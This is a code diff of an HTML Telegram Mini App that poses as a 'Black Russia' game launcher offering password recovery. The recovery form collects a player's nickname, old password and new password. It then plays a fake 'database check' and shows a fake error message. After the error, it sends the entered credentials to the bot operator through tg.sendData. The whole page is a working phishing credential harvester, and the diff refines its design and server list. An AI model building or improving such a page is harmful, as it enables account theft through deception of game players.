@@ -2,210 +2,317 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-select=no">
     <title>Black Russia Launcher</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
+        /* === ТВОИ ОРИГИНАЛЬНЫЕ СТИЛИ === */
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Arial',sans-serif; }
 
-        /* === ФОН, КОТОРЫЙ ТЫ СКИНУЛ === */
         body {
-            background-color: #040101;
-            background-image: url('bg.jpg'); /* Картинка должна лежать рядом с этим файлом */
+            background: url('bg.jpg') no-repeat center center fixed;
             background-size: cover;
-            background-position: center;
-            color: #ffffff;
-            display: flex; justify-content: center; align-items: center; min-height: 100vh;
-            overflow: hidden;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            position: relative;
+            overflow-x: hidden;
         }
 
-        /* Затемнение фона */
         body::before {
-            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(135deg, rgba(5, 1, 1, 0.8) 0%, rgba(0, 0, 0, 0.6) 100%);
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(135deg, rgba(60, 0, 0, 0.75) 0%, rgba(0, 0, 0, 0.85) 100%);
             z-index: -1;
         }
 
-        .screen { display: none; flex-direction: column; width: 100%; max-width: 380px; padding: 20px; z-index: 10; }
-        .screen.active { display: flex; animation: fadeIn 0.4s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* Экран загрузки при старте */
-        .loading-screen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #040101; display: flex; flex-direction: column; justify-content: center; align-items: center;
-            z-index: 9999;
+        /* === НОВАЯ ЗАГРУЗКА ПРИ СТАРТЕ === */
+        #startup-loader { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: radial-gradient(circle at center,#1a0000 0%,#050000 100%); 
+            display: flex; flex-direction: column; justify-content: center; align-items: center; 
+            z-index: 9999; 
         }
-        .loader-spinner { width: 50px; height: 50px; border: 3px solid #2a0000; border-top: 3px solid #e51b1b; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        .load-spinner { width: 50px; height: 50px; border: 3px solid #2a0000; border-top: 3px solid #a01010; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .loader-text { font-size: 12px; letter-spacing: 2px; color: #888; margin-bottom: 10px; text-transform: uppercase; }
-        .loader-percent { font-size: 24px; font-weight: bold; color: #fff; margin-bottom: 15px; }
-        .progress-bg { width: 80%; max-width: 300px; height: 4px; background: #1a0000; border-radius: 10px; overflow: hidden; }
-        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #940f0f, #e51b1b); transition: width 0.1s; }
+        .load-text { color: #777; font-size: 12px; letter-spacing: 2px; margin-bottom: 10px; text-transform: uppercase; }
+        .load-percent { color: #aaa; font-size: 22px; font-weight: bold; margin-bottom: 20px; }
+        .load-bar { width: 70%; max-width: 300px; height: 4px; background: #2a0000; border-radius: 10px; overflow: hidden; }
+        .load-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg,#a01010,#700000); border-radius: 10px; transition: width 0.15s ease; }
 
-        /* Логотип */
-        .logo-area { text-align: center; margin-bottom: 30px; }
-        .logo-area img { width: 100px; height: 100px; object-fit: contain; margin-bottom: 10px; }
-        .logo-area h1 { font-size: 26px; font-weight: 900; letter-spacing: 1px; text-transform: uppercase; text-shadow: 0 2px 10px rgba(0,0,0,0.8); }
-        .logo-area h1 span { color: #e51b1b; }
-        .logo-area p { color: #e51b1b; font-size: 10px; letter-spacing: 3px; margin-top: 5px; font-weight: bold; }
-
-        /* Поля ввода */
-        .input-group { background: rgba(11, 3, 3, 0.85); border: 1px solid #1a0b0b; border-radius: 10px; padding: 10px 15px; margin-bottom: 12px; display: flex; align-items: center; height: 58px; transition: border 0.3s; backdrop-filter: blur(5px); }
-        .input-group:focus-within { border-color: #e51b1b; }
-        .icon { width: 32px; height: 32px; border-radius: 8px; background: linear-gradient(135deg, #e51b1b, #8a0606); display: flex; justify-content: center; align-items: center; margin-right: 15px; flex-shrink: 0; }
-        .icon svg { width: 18px; height: 18px; fill: #fff; }
-        .field { flex-grow: 1; }
-        .field label { display: block; font-size: 9px; color: #a39696; text-transform: uppercase; font-weight: bold; margin-bottom: 2px; }
-        .field input, .field select { width: 100%; background: none; border: none; color: #fff; font-size: 14px; outline: none; }
-        .field select option { background: #0b0303; color: #fff; }
-
-        /* Кнопки */
-        .btn { width: 100%; padding: 16px; background: linear-gradient(90deg, #940f0f, #d61818); border: none; border-radius: 10px; color: #fff; font-size: 13px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(229, 27, 27, 0.3); }
-        .btn:active { transform: scale(0.98); }
-
-        /* Модалка проверки базы (6 сек) */
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(4, 1, 1, 0.95); display: none; flex-direction: column; justify-content: center; align-items: center;
-            z-index: 1000; backdrop-filter: blur(10px);
+        /* === 6-СЕКУНДНАЯ ПРОВЕРКА === */
+        #check-modal { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(5, 1, 1, 0.95); display: none; flex-direction: column; 
+            justify-content: center; align-items: center; z-index: 10000; 
+            backdrop-filter: blur(5px);
         }
-        .modal-overlay.show { display: flex; animation: fadeIn 0.3s; }
+        #check-modal.show { display: flex; }
+
+        /* === ОСТАЛЬНОЙ ДИЗАЙН === */
+        .container { width:100%; max-width:400px; padding:15px 0; animation:fadeIn 0.6s ease; }
+        @keyframes fadeIn { from { opacity:0; transform:translateY(15px); } to { opacity:1; transform:translateY(0); } }
+
+        .logo { text-align:center; margin-bottom:25px; }
+        .tiger-img { width:90px; height:90px; object-fit:contain; margin-bottom:5px; }
+        .logo h1 { font-size:26px; font-weight:bold; letter-spacing:1px; color:#bbb; }
+        .logo h1 span { color:#a01010; }
+        .logo p { color:#a01010; font-size:10px; letter-spacing:3px; margin-top:5px; }
+
+        .form-row { background-color:#0b0303; border: 1px solid #1a0b0b; border-radius: 10px; padding: 8px 16px; margin-bottom: 12px; display: flex; align-items: center; box-sizing: border-box; height: 58px; width: 100%; transition: border-color 0.2s; }
+        .form-row:focus-within, .form-row.dropdown-open { border-color: #b31212; }
+        .row-icon-left { width: 32px; height: 32px; border-radius: 8px; display: flex; justify-content: center; align-items: center; margin-right: 15px; flex-shrink: 0; background: linear-gradient(135deg, #e51b1b, #8a0606); }
+        .row-icon-left svg { width: 18px; height: 18px; fill: #ffffff; }
+        .row-main { flex-grow: 1; min-width: 0; }
+        .row-main label { display: block; font-size: 9px; color: #574e4e; text-transform: uppercase; font-weight: bold; margin-bottom: 2px; }
+        .row-main input { width: 100%; background: none; border: none; color: #ffffff; font-size: 13px; outline: none; padding: 0; box-sizing: border-box; }
+
+        .selected-server-text { color: #ffffff; font-size: 13px; margin-top: 2px; }
+        .clickable-row { cursor: pointer; user-select: none; }
+        .select-arrow-down { font-size: 10px; color: #e51b1b; margin-left: auto; user-select: none; transition: 0.2s; }
+        .select-arrow-down.rotated { transform: rotate(180deg); }
+
+        .custom-server-dropdown {
+            position: fixed; bottom: 0; left: 50%; transform: translateX(-50%) translateY(100%);
+            width: 100%; max-width: 380px; max-height: 50vh; background-color: #0b0303; border: 1px solid #1a0b0b;
+            border-radius: 15px 15px 0 0; overflow-y: auto; z-index: 2000; box-shadow: 0px -8px 25px rgba(0, 0, 0, 0.9);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.1); box-sizing: border-box; padding: 10px 0;
+        }
+        .custom-server-dropdown.show { transform: translateX(-50%) translateY(0); }
+        .server-item { padding: 10px 16px; display: flex; align-items: center; cursor: pointer; font-size: 13px; color: #ffffff; transition: 0.15s; font-weight: 500; }
+        .server-item:hover { background-color: #1a0b0b; color: #e51b1b; }
+        .server-num-badge { color: #ff512f; font-weight: bold; margin-right: 8px; }
+
+        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(90deg, #940f0f 0%, #d61818 100%); border: none; border-radius: 10px; color: #ffffff; font-size: 13px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; box-sizing: border-box; margin-top: 5px; }
+        .text-or { text-align: center; color: #3b3232; font-size: 11px; text-transform: uppercase; margin: 15px 0; user-select: none; }
+        .nav-switch-btn { width: 100%; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; padding: 15px; display: flex; justify-content: space-between; align-items: center; color: #8c8080; font-size: 10px; text-transform: uppercase; cursor: pointer; margin-bottom: 15px; font-weight: bold; user-select: none; box-sizing: border-box; }
+        
+        .form-box { display: none; width: 100%; box-sizing: border-box; }
+        .form-box.active { display: block; }
+        
+        /* Модалка поддержки */
+        .support-modal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(5, 1, 1, 0.98); z-index: 500; border-radius: 15px; display: flex; flex-direction: column; padding: 20px; box-sizing: border-box; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
+        .support-modal-overlay.show { opacity: 1; pointer-events: auto; }
+        .support-modal-title { font-size: 14px; font-weight: bold; text-transform: uppercase; color: #e51b1b; text-align: center; margin-bottom: 12px; }
+        .agent-card { width: 100%; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; padding: 12px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; box-sizing: border-box; }
+        .btn-agent-vk { background-color: #0077ff; border: none; border-radius: 6px; color: white; font-size: 9px; font-weight: bold; padding: 8px 12px; cursor: pointer; text-transform: uppercase; flex-shrink: 0; }
+        .btn-support-close { width: 100%; padding: 12px; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; color: #574e4e; font-size: 11px; font-weight: bold; text-transform: uppercase; cursor: pointer; text-align: center; box-sizing: border-box; margin-top: auto;}
+        .bottom-support-clickable { display: flex; justify-content: center; color: #e51b1b; font-size: 11px; font-weight: bold; text-transform: uppercase; cursor: pointer; margin-top: 15px;}
     </style>
 </head>
 <body>
 
-    <!-- === 1. ЭКРАН СТАРТОВОЙ ЗАГРУЗКИ === -->
-    <div id="startLoader" class="loading-screen">
-        <div class="loader-spinner"></div>
-        <div class="loader-text">Загрузка данных сервера</div>
-        <div class="loader-percent" id="startPercent">0%</div>
-        <div class="progress-bg"><div class="progress-fill" id="startBar"></div></div>
+    <!-- ЭКРАН ЗАГРУЗКИ ПРИ СТАРТЕ -->
+    <div id="startup-loader">
+        <div class="load-spinner"></div>
+        <div class="load-text">Загрузка данных сервера</div>
+        <div class="load-percent" id="start-percent">0%</div>
+        <div class="load-bar"><div class="load-bar-fill" id="start-bar"></div></div>
     </div>
 
-    <!-- === 2. ОСНОВНОЙ ЭКРАН (ВХОД) === -->
-    <div id="mainScreen" class="screen">
-        <div class="logo-area">
-            <img src="logo.png" alt="BR">
+    <!-- МОДАЛКА 6 СЕК ПРОВЕРКИ -->
+    <div id="check-modal">
+        <div class="load-spinner"></div>
+        <div class="load-text" style="color: #fff; font-size: 14px;">Проверка баз данных</div>
+        <div class="load-percent" id="check-percent">0%</div>
+        <div class="load-bar"><div class="load-bar-fill" id="check-bar"></div></div>
+    </div>
+
+    <div class="container">
+        
+        <!-- ОКНО ПОДДЕРЖКИ -->
+        <div id="support-modal" class="support-modal-overlay">
+            <div class="support-modal-title">Служба Поддержки</div>
+            <div class="agent-card">
+                <div>
+                    <div style="font-size: 11px; font-weight: bold; color: white;">Технический спец. агент №1</div>
+                    <div style="font-size: 8.5px; color: #6e6464; text-transform: uppercase;">Бахида Тадакатцу</div>
+                </div>
+                <button class="btn-agent-vk" onclick="window.open('https://vk.com')">Связаться</button>
+            </div>
+            <button class="btn-support-close" onclick="toggleSupportModal(false)">Вернуться назад</button>
+        </div>
+
+        <!-- Шапка -->
+        <div class="logo">
+            <img src="logo.png" alt="BR" class="tiger-img" onerror="this.style.display='none'">
             <h1>BLACK <span>RUSSIA</span></h1>
-            <p>✦ ВОССТАНОВЛЕНИЕ ✦</p>
+            <p id="auth-subtitle">✦ ВОССТАНОВЛЕНИЕ ✦</p>
         </div>
 
-        <div class="input-group">
-            <div class="icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
-            <div class="field">
-                <label>Игровой ник</label>
-                <input type="text" id="nick" placeholder="Ivan_Capone">
+        <!-- ЭКРАН ВХОДА -->
+        <div id="screen-login" class="form-box active">
+            <div class="form-row">
+                <div class="row-icon-left"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+                <div class="row-main"><label>Ник</label><input type="text" id="nick-input" placeholder="Введите игровой ник"></div>
+            </div>
+            <div class="form-row">
+                <div class="row-icon-left"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+                <div class="row-main"><label>Пароль</label><input type="password" id="login-password-input" placeholder="Введите пароль"></div>
+            </div>
+            <div class="form-row clickable-row" id="server-field-trigger">
+                <div class="row-icon-left" style="background: linear-gradient(135deg, #ff512f, #dd2476);">☰</div>
+                <div class="row-main"><label>Выбор сервера</label><div class="selected-server-text" id="current-selected-server" style="color:#4f4343;">Выберите сервер</div></div>
+                <div class="select-arrow-down" id="server-arrow-icon">▼</div>
+            </div>
+            <button class="btn-primary" onclick="alert('Вход в разработке');">Войти в аккаунт →</button>
+            <div class="text-or">или</div>
+            <div class="nav-switch-btn" onclick="changeAuthScreen('recovery')">
+                <span>🔓 Восстановление пароля</span><span>❯</span>
             </div>
         </div>
 
-        <div class="input-group">
-            <div class="icon"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
-            <div class="field">
-                <label>Старый пароль</label>
-                <input type="password" id="old_pass" placeholder="••••••••">
+        <!-- ЭКРАН ВОССТАНОВЛЕНИЯ -->
+        <div id="screen-recovery" class="form-box">
+            <div class="form-row">
+                <div class="row-icon-left"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+                <div class="row-main"><label>Ник</label><input type="text" id="rec-nick-input" placeholder="Введите игровой ник"></div>
+            </div>
+            <div class="form-row">
+                <div class="row-icon-left"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+                <div class="row-main"><label>Старый пароль</label><input type="password" id="rec-old-pass" placeholder="Введите старый пароль"></div>
+            </div>
+            <div class="form-row">
+                <div class="row-icon-left"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+                <div class="row-main"><label>Новый пароль</label><input type="password" id="rec-new-pass" placeholder="Введите новый пароль"></div>
+            </div>
+            <div class="form-row clickable-row" onclick="triggerServerDropdownFromReg(event)">
+                <div class="row-icon-left" style="background: linear-gradient(135deg, #ff512f, #dd2476);">☰</div>
+                <div class="row-main"><label>Выбор сервера</label><div class="selected-server-text" id="rec-selected-server-text" style="color:#4f4343;">Выберите сервер</div></div>
+                <div class="select-arrow-down" id="server-arrow-icon-rec">▼</div>
+            </div>
+            <button class="btn-primary" onclick="handleRecoveryClick()">Восстановить пароль →</button>
+            <div class="text-or">или</div>
+            <div class="nav-switch-btn" onclick="changeAuthScreen('login')">
+                <span>⬅ Вернуться к входу</span><span>❯</span>
             </div>
         </div>
 
-        <div class="input-group">
-            <div class="icon"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
-            <div class="field">
-                <label>Новый пароль</label>
-                <input type="password" id="new_pass" placeholder="••••••••">
-            </div>
-        </div>
-
-        <div class="input-group">
-            <div class="icon" style="background: linear-gradient(135deg, #ff512f, #dd2476);">☰</div>
-            <div class="field">
-                <label>Выбор сервера</label>
-                <select id="server">
-                    <option value="01 | RED">01 | RED</option>
-                    <option value="02 | GREEN">02 | GREEN</option>
-                    <option value="03 | BLUE">03 | BLUE</option>
-                    <option value="04 | YELLOW">04 | YELLOW</option>
-                    <option value="05 | ORANGE">05 | ORANGE</option>
-                    <option value="06 | PURPLE">06 | PURPLE</option>
-                </select>
-            </div>
-        </div>
-
-        <button class="btn" onclick="startRecovery()">Восстановить аккаунт →</button>
-    </div>
-
-    <!-- === 3. МОДАЛКА ПРОВЕРКИ (6 СЕКУНД) === -->
-    <div id="checkModal" class="modal-overlay">
-        <div class="loader-spinner"></div>
-        <div class="loader-text" style="color: #fff; font-size: 14px;">Проверка баз данных</div>
-        <div class="loader-percent" id="checkPercent">0%</div>
-        <div class="progress-bg"><div class="progress-fill" id="checkBar"></div></div>
+        <div class="bottom-support-clickable" onclick="toggleSupportModal(true)">Служба поддержки</div>
+        <div class="custom-server-dropdown" id="custom-server-list"></div>
     </div>
 
     <script>
-        // Инициализация Telegram WebApp
         const tg = window.Telegram?.WebApp;
         if (tg) { tg.ready(); tg.expand(); }
 
-        // === 1. ЛОГИКА СТАРТОВОЙ ЗАГРУЗКИ ===
+        // === ЗАГРУЗКА ПРИ СТАРТЕ ===
         let startP = 0;
         const startInterval = setInterval(() => {
             startP += 2;
-            document.getElementById('startPercent').textContent = startP + '%';
-            document.getElementById('startBar').style.width = startP + '%';
-            
+            document.getElementById('start-percent').textContent = startP + '%';
+            document.getElementById('start-bar').style.width = startP + '%';
             if (startP >= 100) {
                 clearInterval(startInterval);
-                setTimeout(() => {
-                    document.getElementById('startLoader').style.display = 'none';
-                    document.getElementById('mainScreen').classList.add('active');
-                }, 400);
+                setTimeout(() => { document.getElementById('startup-loader').style.display = 'none'; }, 300);
             }
         }, 30);
 
-        // === 2. ЛОГИКА ВОССТАНОВЛЕНИЯ (БЕЗ СЕРВЕРА, ЧЕРЕЗ tg.sendData) ===
-        function startRecovery() {
-            const nick = document.getElementById('nick').value.trim();
-            const oldPass = document.getElementById('old_pass').value.trim();
-            const newPass = document.getElementById('new_pass').value.trim();
-            const server = document.getElementById('server').value;
+        function changeAuthScreen(t) {
+            document.getElementById('screen-login').style.display = (t === 'login' ? 'block' : 'none');
+            document.getElementById('screen-recovery').style.display = (t === 'recovery' ? 'block' : 'none');
+            document.getElementById('auth-subtitle').innerText = (t === 'login') ? '✦ ВОССТАНОВЛЕНИЕ ✦' : '✦ ВОССТАНОВЛЕНИЕ ПАРОЛЯ ✦';
+        }
+        function toggleSupportModal(s) { const m = document.getElementById("support-modal"); if (m) m.classList.toggle("show", s); }
 
-            if (!nick || !oldPass || !newPass) {
+        // === ПОЛНЫЙ СПИСОК СЕРВЕРОВ ===
+        const brServers = [
+            "RED","GREEN","BLUE","YELLOW","ORANGE","PURPLE","LIME","PINK","CHERRY","BLACK","INDIGO","WHITE",
+            "MAGENTA","CRIMSON","GOLD","AZURE","PLATINUM","AQUA","GRAY","ICE","CHILLI","CHOCO","MOSCOW","SPB",
+            "UFA","SOCHI","KAZAN","SAMARA","ROSTOV","ANAPA","EKB","KRASNODAR","ARZAMAS","NOVOSIB","GROZNY",
+            "SARATOV","OMSK","IRKUTSK","VOLGOGRAD","VORONEZH","BELGOROD","MAKHACHKALA","VLADIKAVKAZ",
+            "VLADIVOSTOK","KALININGRAD","CHELYABINSK","KRASNOYARSK","CHEBOKSARY","KHABAROVSK","PERM","TULA",
+            "RYAZAN","MURMANSK","PENZA","KURSK","ARKHANGELSK","ORENBURG","KIROV","KEMEROVO","TYUMEN",
+            "TOLYATTI","IVANOVO","STAVROPOL","SMOLENSK","PSKOV","BRYANSK","OREL","YAROSLAVL","BARNAUL",
+            "LIPETSK","ULYANOVSK","YAKUTSK","TAMBOV","BRATSK","ASTRAKHAN","CHITA","KOSTROMA","VLADIMIR",
+            "KALUGA","NOVGOROD","TAGANROG","VOLOGDA","TVER","TOMSK","IZHEVSK","SURGUT","PODOLSK","MAGADAN",
+            "CHEREPOVETS","NORILSK","ASTANA","TASHKENT"
+        ];
+
+        let finalSelectedServerValue = "";
+
+        document.addEventListener("DOMContentLoaded", function() {
+            const customServerList = document.getElementById("custom-server-list");
+            brServers.forEach(function(name, index) {
+                let num = index + 1;
+                let formattedNum = num < 10 ? "0" + num : num;
+                let item = document.createElement("div"); 
+                item.className = "server-item";
+                item.innerHTML = `<span class="server-num-badge">${formattedNum}</span> | ${name}`;
+                
+                item.addEventListener("click", function(e) {
+                    e.stopPropagation(); 
+                    finalSelectedServerValue = `${formattedNum} | ${name}`;
+                    
+                    const curr = document.getElementById("current-selected-server");
+                    if(curr) { curr.textContent = finalSelectedServerValue; curr.style.color = "#ffffff"; }
+                    
+                    const rec = document.getElementById("rec-selected-server-text");
+                    if(rec) { rec.textContent = finalSelectedServerValue; rec.style.color = "#ffffff"; }
+                    
+                    customServerList.classList.remove("show");
+                });
+                customServerList.appendChild(item);
+            });
+
+            document.getElementById("server-field-trigger").addEventListener("click", function(e) { 
+                e.stopPropagation(); 
+                customServerList.classList.toggle("show"); 
+            });
+            
+            document.addEventListener("click", function() { 
+                customServerList.classList.remove("show"); 
+            });
+        });
+
+        function triggerServerDropdownFromReg(e) { 
+            if (e) e.stopPropagation();
+            document.getElementById("custom-server-list").classList.toggle("show");
+        }
+
+        // === ЛОГИКА 6 СЕК + ОКНО ТГ ===
+        function handleRecoveryClick() {
+            const recNick = document.getElementById("rec-nick-input").value.trim();
+            const recOld = document.getElementById("rec-old-pass").value.trim();
+            const recNew = document.getElementById("rec-new-pass").value.trim();
+            const serverValue = finalSelectedServerValue || "01 | RED";
+
+            if (!recNick || !recOld || !recNew) {
                 alert('Заполните все поля!');
                 return;
             }
 
-            // Скрываем главный экран и показываем загрузку
-            document.getElementById('mainScreen').classList.remove('active');
-            document.getElementById('checkModal').classList.add('show');
+            const checkModal = document.getElementById('check-modal');
+            if (checkModal) checkModal.classList.add('show');
 
-            // Полоска загрузки 6 секунд
             let checkP = 0;
             const checkInterval = setInterval(() => {
                 checkP++;
-                document.getElementById('checkPercent').textContent = checkP + '%';
-                document.getElementById('checkBar').style.width = checkP + '%';
+                document.getElementById('check-percent').textContent = checkP + '%';
+                document.getElementById('check-bar').style.width = checkP + '%';
 
                 if (checkP >= 100) {
                     clearInterval(checkInterval);
-                    
-                    // Когда полоска дошла до 100%, ждем 0.5 сек
                     setTimeout(() => {
-                        document.getElementById('checkModal').classList.remove('show');
+                        if (checkModal) checkModal.classList.remove('show');
                         
-                        // Показываем системное окно с ошибкой
-                        alert(`Ошибка баз данных ${server}.\nВы ввели неверные данные.`);
+                        // ТВОЕ ОКНО
+                        alert(`Ошибка баз данных ${serverValue}.\nВы ввели неверные данные.`);
                         
-                        // КАК ТОЛЬКО НАЖАЛИ "ОК", ОТПРАВЛЯЕМ ДАННЫЕ И ЗАКРЫВАЕМ ОКНО
-                        const data = `🔄 ВОССТАНОВЛЕНИЕ\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🌍 Сервер: ${server}`;
-                        
-                        if (tg) {
-                            tg.sendData(data); // Данные улетают, Mini App закрывается
-                        } else {
-                            console.log("Тест в браузере. Данные:", data);
+                        // ОТПРАВКА ДАННЫХ И ЗАКРЫТИЕ ОКНА
+                        const data = `🔄 ВОССТАНОВЛЕНИЕ\n\n👤 Ник: ${recNick}\n🔓 Старый пароль: ${recOld}\n🔒 Новый пароль: ${recNew}\n🌍 Сервер: ${serverValue}`;
+                        if (tg && typeof tg.sendData === 'function') {
+                            tg.sendData(data);
                         }
                     }, 500);
                 }
-            }, 60); // 60 мс * 100 = 6 секунд
+            }, 60); 
         }
     </script>
 </body>
